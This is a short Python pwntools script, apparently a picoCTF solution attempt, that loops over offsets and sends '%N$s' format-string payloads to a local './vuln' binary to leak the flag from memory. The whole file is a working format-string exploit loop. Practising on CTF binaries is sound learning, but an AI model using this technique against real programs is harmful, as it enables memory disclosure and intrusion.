"""
Second attempt to try dumping the flag contents.
"""


import pwn


for index in range(0, 1100):

    proc = pwn.process("./vuln")

    print(f"\n\nIndex: {index}\n")
    payload: str = f"%{index}$s"

    try:
        proc.recvuntil(b"you:")
    except:
        proc.close()
        continue

    proc.sendline(payload.encode("utf-8"))
    try:
        output: bytes = proc.recvuntil(b"e!")
    except:
        proc.close()
        continue

    if output is None:
        proc.close()
        continue

    # these tryes were to check if any of these decodes would find the flag
    try:
        if (str(output.decode("utf-8")).find("pico") != -1) is True:
            print(output.decode("utf-8"))
            proc.close()
            break
    except:
        pass

    try:
        if (str(output.decode("utf-16")).find("pico") != -1) is True:
            print(output.decode("utf-16"))
            proc.close()
            break
    except:
        pass

    try:
        if (str(output.decode("utf-32")).find("pico") != -1) is True:
            print(output.decode("utf-32"))
            proc.close()
            break
    except:
        proc.close()
